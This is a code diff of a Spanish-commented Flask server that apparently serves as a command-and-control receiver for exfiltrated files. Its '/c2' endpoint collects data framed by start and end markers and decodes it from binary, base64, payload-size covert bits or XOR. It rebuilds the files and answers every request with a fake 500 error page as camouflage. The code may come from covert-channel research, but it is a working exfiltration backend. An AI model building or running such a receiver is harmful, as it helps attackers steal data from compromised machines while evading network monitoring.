@@ -1,44 +1,127 @@
-from flask import Flask, request
+from flask     import Flask, request
+import base64
+import os
+import hashlib
+import logging
 
-# Instancia flask
+log = logging.getLogger('werkzeug')
+log.setLevel(logging.ERROR)
+
 app = Flask(__name__)
 
-# Define variable
-receivedBits   = []
-contentReceived = ''
+# Definir variables
+message = "<!DOCTYPE html><html><head><title>500 Internal Server Error</title></head><body><h1>500 Internal Server Error</h1><p>Something went wrong on the server.</p></body></html>"
+transmitting        = False
+receivedData        = bytearray()
+encodingMethod      = None
+secondDecodeProcess = None
+indexData           = 0
 
-# Crea ruta de acceso con método POST
+# Carpeta para guardar los archivos reconstruidos
+outputFolder = "output"
+os.makedirs(outputFolder, exist_ok=True)
+
+
+@app.route('/', methods=['GET'])
+def endpointA():
+    global message
+    return message, 500
+
+# Ruta para recibir datos
 @app.route('/c2', methods=['POST'])
-def c2_endpoint():
-    global contentReceived
-    # Obtiene el largo del payload recibido
-    contentLength = request.content_length
-    # Si no contiene payload indica error.
-    if contentLength is None: return 'No content length', 400
-    # Define umbral para interpretar bit
-    if contentLength == 200: bit = '0' # Tamaño payload 200
-    else:                    bit = '1' # Tamaño payload 300
+def endpoint():
+    global receivedData
+    global transmitting
+    global encodingMethod
+    global secondDecodeProcess
+    global indexData
+    global message
+    START_WORD = b"START010203"
+    END_WORD   = b"END010203"
+    
+    # Obtiene el payload recibido
+    payload = request.data
+    payload = payload.split(b'|')
 
-    # Añade bit a lista bits
-    receivedBits.append(bit)
-    # Decodifica cada conjunto de 8 bits (1 byte) a texto.
-    if len(receivedBits) % 8 == 0:
-        # Decodifica cada byte
-        byteString      = ''.join(receivedBits[-8:])
-        # Transforma en carácter
-        contentReceived += chr(int(byteString, 2))
-        # Limpia la lista
-        receivedBits.clear()
+    # Inicio transmisión
+    if START_WORD in payload:
+        print("\n[+] Inicio recepción.")
+        transmitting = True
+        # Reinicializar variables
+        receivedData        = bytearray()
+        encodingMethod      = None
+        secondDecodeProcess = None
+        indexData           = 0
+    
+    # Fin transmisión
+    elif END_WORD in payload and transmitting:
+        print("[+] Fin recepcion.")
 
-        # Identifica si se ha recibido la palabra de fin emisión.
-        if "ENDED010203" in contentReceived:
-            # Elimina palabra final
-            contentReceived = contentReceived.replace("ENDED010203","")
-            # Imprime el resultado
-            print(f"Contenido recibido: '{contentReceived}'")
-            # Limpia la variable
-            contentReceived = ""
-    return 'OK', 200
+        if secondDecodeProcess:
+            secondDecodeProcess, indexData, receivedData = decodeData(encodingMethod=secondDecodeProcess, indexData=indexData, encodedData=receivedData)
+
+        getHashData(data=receivedData)
+        # Reinicializar variables
+        transmitting        = False
+        receivedData        = bytearray()
+        encodingMethod      = None
+        secondDecodeProcess = None
+        indexData           = 0
+
+    # Captura método codificación
+    elif transmitting and not encodingMethod:
+        encodingMethod = payload[0].decode("utf-8")
+        encodingMethod = encodingMethod.split("To")
+        encodingMethod = 'To'.join(encodingMethod[::-1])
+        # Imprimir método codificación        
+        print(f"[+] Método codificación: {encodingMethod}")
+
+    # Captura datos fichero
+    elif transmitting and encodingMethod:
+        for encodedData in payload:
+            secondDecodeProcess, indexData, data = decodeData(encodingMethod=encodingMethod, indexData=indexData, encodedData=encodedData)
+            receivedData.extend(data)
+
+    return message, 500
+
+
+def getHashData(data):
+    _hash = hashlib.new('sha256')
+    _hash.update(data)
+    print(f'[+] Hash: {_hash.hexdigest()}')
+
+
+def decodeData(encodingMethod, encodedData, indexData=0):
+    secondDecodeProcess = None
+    data                = None
+    
+    # Decodificar bit en Bytes
+    if encodingMethod == "BitsToByte":
+        # Convertir byte a carácter
+         data = bytes(int(encodedData[index:index+8], 2) for index in range(0, len(encodedData), 8))
+
+    # Convertir base64 a byte
+    elif encodingMethod == "Base64ToByte":
+        data = base64.b64decode(encodedData)
+
+    # Convertir representación bit por tamaño cadena a bit y bit a byte
+    elif encodingMethod == "PayloadSizeToBitToByte":
+        if len(encodedData) == 1: data = b"0" # Tamaño 1 para bit 0
+        else:                     data = b"1" # Tamaño 2 para bit 1
+        secondDecodeProcess = "BitsToByte"
+
+    elif encodingMethod == "XorToByte":
+        key = b"key"
+        encodedData = int(encodedData)
+        data        = encodedData ^ key[indexData % len(key)]
+        data        = data.to_bytes(1, byteorder='big')
+        indexData   += 1
+
+    # Si no está contemplado
+    else:
+        print("[+] No existe método de decodificación")
+    
+    return secondDecodeProcess, indexData, data
 
 if __name__ == '__main__':
-    app.run(port=5000)
+    app.run(debug=False, port=5000)
